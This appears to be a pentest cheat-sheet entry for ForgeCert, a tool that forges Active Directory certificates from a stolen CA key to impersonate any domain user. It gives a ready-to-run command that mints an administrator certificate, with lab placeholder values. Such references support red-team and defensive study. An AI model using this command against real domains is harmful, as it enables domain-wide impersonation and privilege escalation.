---
description: |
  ForgeCert is a .NET tool that crafts "golden certificates" once an attacker has compromised a Certificate Authority's private key and CA certificate (e.g. via ESC7/DCOM abuse, or direct extraction from a compromised CA server). Similar to a Golden Ticket for Kerberos, a forged certificate lets an attacker impersonate any user in the domain, including accounts created after the CA compromise, by minting a valid client-authentication certificate for that user directly, then using it for PKINIT authentication.

  Command Reference:

  	Target IP: 10.10.10.1

  	Domain: test.local

  	CA certificate: CA.pfx

  	CA certificate password: password123

  	Impersonated user: administrator

  	Impersonated user SID: S-1-5-21-1339291983-1349129144-367733775-500

command: |
  ForgeCert.exe --CaCertPath CA.pfx --CaCertPassword password123 --Subject "CN=administrator" --SubjectAltName administrator@test.local --NewCertPath administrator_forged.pfx --NewCertPassword password123
items:
  - PFX
services:
  - ADCS
OS:
  - Windows
phases:
  - PrivEsc
references:
  - https://github.com/GhostPack/ForgeCert
  - https://posts.specterops.io/certified-pre-owned-d95910965cd2
---
